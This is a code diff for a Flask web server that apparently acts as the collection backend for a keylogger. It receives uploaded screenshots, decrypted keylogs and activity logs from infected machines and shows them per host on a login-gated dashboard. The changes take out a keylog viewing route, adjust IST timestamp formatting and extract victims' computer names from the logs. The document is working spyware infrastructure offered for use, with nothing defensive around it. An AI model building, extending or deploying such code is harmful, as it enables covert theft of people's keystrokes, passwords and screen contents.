@@ -40,7 +40,7 @@ HTML_TEMPLATE = '''
       <button type="submit">Login</button>
     </form>
   {% else %}
-    <h2> Logs in Server</h2>
+    <center><h2>Log Viewer (Live Feed)</h2></center>
     <table>
       <tr>
         {% for col in columns %}
@@ -52,15 +52,7 @@ HTML_TEMPLATE = '''
           <td>{{ folder.hostname }}</td>
           <td>{{ folder.timestamp }}</td>
           {% for file in folder.files %}
-            <td>
-              {% if file %}
-                {% if file.endswith("decrypted_keylogs.txt") %}
-                  <a href="/view/{{ folder.foldername }}/{{ file.split('/')[-1] }}">📄 View</a>
-                {% else %}
-                  <a href="{{ file }}">📥 View/Download</a>
-                {% endif %}
-              {% else %}-{% endif %}
-            </td>
+            <td>{% if file %}<a href="{{ file }}">📥 View/Download</a>{% else %}-{% endif %}</td>
           {% endfor %}
         </tr>
       {% endfor %}
@@ -84,30 +76,41 @@ def index():
         for folder in sorted(os.listdir(UPLOAD_ROOT), reverse=True):
             full_path = os.path.join(UPLOAD_ROOT, folder)
             if os.path.isdir(full_path):
-                row = {"hostname": "", "timestamp": "", "files": [], "foldername": folder}
-                for col in COLUMNS[2:]:
-                    match_file = next((f for f in os.listdir(full_path) if col.lower().replace(" ", "_") in f.lower()), None)
-                    if match_file:
-                        file_path = os.path.join(full_path, match_file)
-                        if "host" in match_file.lower():
-                            try:
-                                with open(file_path, "r", encoding="utf-8") as f:
-                                    row["hostname"] = f.read().strip().split("\n")[0]
-                            except:
-                                row["hostname"] = "Unknown"
-                        elif "screenshot" in match_file.lower():
-                            row["files"].append(f"/download/{folder}/{match_file}")
-                        elif "decrypted_keylogs" in match_file.lower():
-                            row["files"].append(f"/download/{folder}/{match_file}")
-                        else:
-                            row["files"].append(f"/download/{folder}/{match_file}")
-                    else:
-                        row["files"].append(None)
+                # Convert folder name timestamp to IST format
                 try:
-                    india_time = datetime.now(pytz.timezone("Asia/Kolkata")).strftime("%H:%M:%S__%d:%m:%Y")
+                    dt = datetime.strptime(folder, "%Y-%m-%d_%H-%M-%S")
+                    utc = pytz.utc.localize(dt)
+                    ist = utc.astimezone(pytz.timezone('Asia/Kolkata'))
+                    formatted_timestamp = ist.strftime("%H:%M:%S__%d:%m:%Y")
                 except:
-                    india_time = "Time Error"
-                row["timestamp"] = india_time
+                    formatted_timestamp = folder
+
+                row = {"hostname": "", "timestamp": formatted_timestamp, "files": []}
+
+                for col in COLUMNS[2:]:
+                    matched = False
+                    for f in os.listdir(full_path):
+                        normalized = col.lower().replace(" ", "_")
+                        if normalized in f.lower():
+                            file_path = os.path.join(full_path, f)
+                            row["files"].append(f"/download/{folder}/{f}")
+                            matched = True
+                            break
+                    if not matched:
+                        row["files"].append(None)
+
+                # Extract hostname from activity_log.txt
+                activity_log_file = next((f for f in os.listdir(full_path) if "activity_log" in f.lower()), None)
+                if activity_log_file:
+                    try:
+                        with open(os.path.join(full_path, activity_log_file), "r", encoding="utf-8") as f:
+                            for line in f:
+                                if "Computer Name:" in line:
+                                    row["hostname"] = line.split(":", 1)[1].strip()
+                                    break
+                    except:
+                        row["hostname"] = "Unknown"
+
                 if not row["hostname"]:
                     row["hostname"] = folder.split("_")[0]
                 log_entries.append(row)
@@ -116,7 +119,7 @@ def index():
 
 @app.route("/api/receive", methods=["POST"])
 def receive():
-    folder_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    folder_name = datetime.utcnow().strftime("%Y-%m-%d_%H-%M-%S")
     save_dir = os.path.join(UPLOAD_ROOT, folder_name)
     os.makedirs(save_dir, exist_ok=True)
     for f in request.files.values():
@@ -127,12 +130,3 @@ def receive():
 @app.route("/download/<folder>/<filename>")
 def download(folder, filename):
     return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)
-
-@app.route("/view/<folder>/<filename>")
-def view_file(folder, filename):
-    try:
-        with open(os.path.join(UPLOAD_ROOT, folder, filename), "r", encoding="utf-8") as f:
-            content = f.read()
-        return f"<pre style='color:lime; background:black; padding:10px; font-family:monospace;'>{content}</pre>"
-    except:
-        return "Error opening file."
